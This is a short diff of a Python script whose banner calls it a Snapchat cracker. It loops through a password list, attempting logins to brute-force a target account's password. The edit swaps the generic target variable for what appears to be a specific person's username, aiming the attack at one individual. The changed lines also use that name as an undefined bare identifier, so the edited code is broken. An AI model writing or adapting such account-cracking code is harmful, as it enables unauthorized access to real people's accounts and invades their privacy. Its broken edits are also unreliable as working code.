@@ -38,7 +38,7 @@ print("████████████████████████�
 print("█                       SNAPCHAT CRACKER BY A HOT TRANS GIRL                         █")
 print("██████████████████████████████████████████████████████████████████████████████████████")
 
-print(f"[░]Now attempting to crack: {targetusername}")
+print(f"[░]Now attempting to crack: {abbeymallory8}")
 
 # Calling class 'Snapchat' from pysnap.__init__
 proxy = ''
@@ -52,7 +52,7 @@ def main(counter):
 
 	for targetpassword in passwords:
 		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
-		can_login = s.login(targetusername, targetpassword)
+		can_login = s.login(abbeymallory8, targetpassword)
 			
 		is_logged = can_login.find(b'logged')
 		if is_logged > 0:
